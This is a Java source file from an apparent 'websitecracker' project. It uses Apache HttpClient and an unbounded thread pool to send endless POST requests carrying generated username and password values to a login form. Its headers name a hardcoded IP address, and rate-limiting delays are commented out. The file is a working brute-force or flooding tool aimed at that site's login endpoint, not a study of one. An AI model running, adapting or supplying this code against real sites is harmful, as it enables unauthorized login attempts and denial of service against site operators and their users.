package io.github.fxzjshm.websitecracker;

import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.RedirectStrategy;
import org.apache.http.client.config.CookieSpecs;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.protocol.HttpClientContext;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.conn.PoolingHttpClientConnectionManager;
import org.apache.http.impl.cookie.BasicClientCookie;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;
import org.apache.http.util.EntityUtils;

public class ApacheHTTPClientWrapper extends ClientWrapper {
    PoolingHttpClientConnectionManager cm;
    CloseableHttpClient httpClient;
    HttpContext context;
    BasicCookieStore store;
    ExecutorService cachedThreadPool = new ThreadPoolExecutor(0, Integer.MAX_VALUE, Long.MAX_VALUE,
            TimeUnit.SECONDS, new SynchronousQueue<Runnable>());

    public ApacheHTTPClientWrapper(String target, String userAgent, String usernameField, String passwordField)
            throws MalformedURLException {
        super(target, userAgent, usernameField, passwordField);

        cm = new PoolingHttpClientConnectionManager();
        cm.setMaxTotal(100000);
        cm.setDefaultMaxPerRoute(100000);
        cm.setValidateAfterInactivity(25000);


        store = new BasicCookieStore();
        BasicClientCookie cookie0 = new BasicClientCookie("userid", "0");
        cookie0.setDomain(new URL(target).getHost());
        store.addCookie(cookie0);
        RequestConfig requestConfig=RequestConfig.custom().setCookieSpec(CookieSpecs.IGNORE_COOKIES)
                /*.setConnectionRequestTimeout(1).setConnectTimeout(1).setSocketTimeout(1)*/.setRedirectsEnabled(false).build();
        httpClient = HttpClients.custom().setConnectionManager(cm).setDefaultCookieStore(store)
                .setDefaultRequestConfig(requestConfig).disableRedirectHandling()
                .build();

        context = new BasicHttpContext();
        context.setAttribute(HttpClientContext.COOKIE_STORE, store);
    }

    @Override
    public void start() {
        System.out.println("Initalized.");
        Scanner in = new Scanner(System.in);
        while (true) {
            int n = in.nextInt();
            addThread(n);
        }
        // httpClient.close();
    }

    public void addThread(int n) {
        System.out.println("+" + n);
        for (int i = 1; i <= n; i++) {
            RunnablePost run = new RunnablePost(this);


            cachedThreadPool.execute(() -> {
                run.run();
            });
            /*try {
                Thread.sleep(666 + U.r.nextInt(233));
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                // e.printStackTrace();
            }*/
        }
    }

    public static class RunnablePost implements Runnable {

        final ApacheHTTPClientWrapper w;

        public RunnablePost(ApacheHTTPClientWrapper w) {
            this.w = w;
        }

        @Override
        public void run() {
            try {
                Field field = BasicCookieStore.class.getDeclaredField("cookies");
                field.setAccessible(true);
                // @SuppressWarnings("unchecked")
                // TreeSet<Cookie> cookies = (TreeSet<Cookie>) field.get(w.store);

                while (true) {
                    try {
                        ArrayList<NameValuePair> list = new ArrayList<>(3);
                        list.add(new BasicNameValuePair(w.unf, U.gU()));
                        list.add(new BasicNameValuePair(w.pwf, U.gP()));
                        list.add(new BasicNameValuePair("submit", ""));

                        HttpPost post = new HttpPost(w.t);
                        post.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                        post.setHeader("Connection", "Keep-Alive");
                        post.setHeader("User-Agent", w.ua);
                        post.setHeader("Accept-Language","zh,en-US;q=0.7,en;q=0.3");
                        post.setHeader("Referer", "http://45.207.28.97/v%5Eys/v%5E4/qt.php");
                        post.setHeader("Pragma","no-cache");
                        post.setHeader("Origin","http://45.207.28.97");
                        // cookies.
                        // synchronized (cookies) {
                        // for (Cookie c : cookies) {
                        // if (c.getName().equalsIgnoreCase("PHPSESSID")) {
                        // cookies.remove(c);
                        // break;
                        // }
                        // }
                        // }

                        post.setEntity(new UrlEncodedFormEntity(list));
                        post.setHeader("Content-Type","application/x-www-form-urlencoded");
                        // System.out.println(post.getRequestLine());

                        HttpResponse response = w.httpClient.execute(post, w.context);
                        post.releaseConnection();
                        System.out.println(System.currentTimeMillis() + " : " + response.getStatusLine().getStatusCode());
                        System.out.println(EntityUtils.toString(response.getEntity()));
                        // Thread.sleep(66 + U.r.nextInt(233));
                    } catch (Exception e) {
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

}
